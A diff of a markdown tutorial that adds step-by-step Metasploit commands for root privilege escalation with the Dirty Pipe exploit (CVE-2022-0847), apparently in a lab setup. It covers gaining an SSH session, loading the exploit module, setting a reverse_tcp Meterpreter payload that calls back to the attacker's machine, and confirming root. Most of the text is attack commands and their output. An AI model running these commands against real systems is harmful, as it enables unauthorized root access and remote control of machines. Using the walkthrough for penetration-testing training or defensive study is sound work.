@@ -38,35 +38,51 @@ Metasploit Framework is installed and running.
 Step 1: Gain Initial Access to Target
 You can use any method to get a shell or Meterpreter session. For example:
 
+     use exploit/multi/ssh/sshexec
+    set RHOSTS 192.168.0.121
+    set USERNAME kali
+    set PRIVATE_KEY /path/to/id_rsa
+    set CMD "id"
+    run
+
 If successful, this will give you a shell session.
 
 Step 2: List Active Sessions
 
+
+    sessions
 Example output:
 
 Active sessions
-===============
 
-  Id  Name  Type            Information         Connection
-  --  ----  ----            -----------         ----------
-  1         shell linux     kali@target         192.168.0.123:4444 -> 192.168.0.121:5555
+    Id  Name  Type            Information         Connection
+    1         shell linux     kali@target         192.168.0.123:4444 -> 192.168.0.121:5555
 Step 3: Use the Dirty Pipe Exploit Module
 
+    use exploit/linux/local/cve_2022_0847_dirtypipe
 Step 4: Set Required Options
+
+    set SESSION 1           # Use the session ID from step 2
+    set LHOST 192.168.0.123 # Your attack machine IP
 
 You can also set the payload if needed:
 
+    set PAYLOAD linux/x64/meterpreter/reverse_tcp
+    set LPORT 4444
 
 Step 5: Run the Exploit
 
+    run
 If successful, you’ll get a root-level Meterpreter session.
 
 Step 6: Verify Privilege Escalation
 
+    sessions -i 2   # (Assuming new session is ID 2)
+    getuid
 Expected output:
 
-Server username: root
- Troubleshooting Tips
+    Server username: root
+Troubleshooting Tips
 If SESSION is not set, Metasploit will throw:
 Msf::OptionValidateError One or more options failed to validate: SESSION.
 Ensure the target is vulnerable to Dirty Pipe.
